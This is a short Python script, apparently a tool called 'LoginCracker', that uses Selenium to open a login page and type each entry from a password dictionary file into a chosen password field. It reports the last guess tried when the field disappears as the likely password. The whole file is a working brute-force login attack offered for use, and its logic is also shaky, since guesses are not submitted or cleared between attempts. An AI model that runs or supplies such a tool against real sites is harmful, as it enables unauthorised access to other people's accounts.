import selenium
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import requests
import time
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

service = Service(executable_path="Path to chromedriver")
pos_pass = ""

print("  _                 _        _____                _\n"
      " | |               (_)      / ____|              | |\n"
      " | |     ___   __ _ _ _ __ | |     _ __ __ _  ___| | _____ _ __\n"
      " | |    / _ \\ / _` | | '_ \\| |    | '__/ _` |/ __| |/ / _ | '__|\n"
      " | |___| (_) | (_| | | | | | |____| | | (_| | (__|   |  __| |\n"
      " |______\\___/ \\__, |_|_| |_|\\_____|_|  \\__,_|\\___|_|\\_\\___|_|\n"
      "               __/ |\n"
      "              |___/\n")
IP = input("Enter the URL: ")
try:
    if requests.get(IP).status_code == 200:
        in_psw_sel = input("Enter password box selector: ")
        in_psw_list = input("Enter password dictionary: ")
        chrome = webdriver.Chrome(service=service)
        chrome.get(IP)
        time.sleep(2)
        for line in open(in_psw_list, 'r'):
            psw_sel = chrome.find_element(by=By.CSS_SELECTOR, value=in_psw_sel)
            psw_sel.send_keys(line)
            time.sleep(0.25)
            print("\n-----------------------\nTried: " + line)
            pos_pass = line
except selenium.common.exceptions.NoSuchElementException:
    if pos_pass == "":
        print("Wrong password box selector")
    else:
        print("Found password or too many login attempts")
        print("Possible password is \"" + pos_pass + "\"")
